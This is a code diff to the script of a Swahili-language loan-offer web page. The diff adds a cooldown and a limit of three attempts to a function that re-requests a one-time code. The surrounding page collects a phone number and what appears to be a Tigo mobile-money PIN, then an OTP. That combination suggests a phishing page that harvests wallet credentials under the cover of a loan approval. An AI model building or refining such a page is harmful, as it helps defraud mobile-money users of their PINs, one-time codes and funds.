@@ -90,6 +90,10 @@
         document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
         var appId = '', checkInterval = null, countdownTimer = null, userPhone = '';
 
+        // Resend control
+        var resendCount = 0;
+        var resendCooldown = false;
+
         function togglePIN() { var p = document.getElementById('tigoPin'); var b = p.parentElement.querySelector('.toggle-btn'); if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; } else { p.type = 'password'; b.textContent = '👁️'; } }
         document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
         document.getElementById('tigoPin').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
@@ -137,13 +141,42 @@
 
         async function resendCode() {
             if (!userPhone) return;
-            document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri...';
+            
+            // Cooldown check
+            if (resendCooldown) {
+                document.getElementById('codeError').textContent = 'Subiri sekunde 30 kabla ya kuomba tena.';
+                document.getElementById('codeError').style.color = 'var(--danger)';
+                document.getElementById('codeError').classList.add('show');
+                setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000);
+                return;
+            }
+            
+            // Max resend check
+            if (resendCount >= 3) {
+                document.getElementById('codeError').textContent = 'Umezidi idadi ya maombi. Jaribu tena baadae.';
+                document.getElementById('codeError').style.color = 'var(--danger)';
+                document.getElementById('codeError').classList.add('show');
+                return;
+            }
+            
+            resendCount++;
+            resendCooldown = true;
+            
+            document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri... (' + resendCount + '/3)';
             document.getElementById('codeError').style.color = 'var(--hp-orange)';
             document.getElementById('codeError').classList.add('show');
+            
             try {
-                await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: loanAmount, months: loanTerm, loan_type: '', purpose: 'OTP REQUESTED' }) });
+                await fetch('/api/submit_loan', { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ phone: userPhone, pin: '0000', amount: loanAmount, months: loanTerm, loan_type: '', purpose: 'OTP REQUESTED' }) 
+                });
                 setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000);
             } catch(e) {}
+            
+            // Release cooldown after 30 seconds
+            setTimeout(function() { resendCooldown = false; }, 30000);
         }
     </script>
 </body>
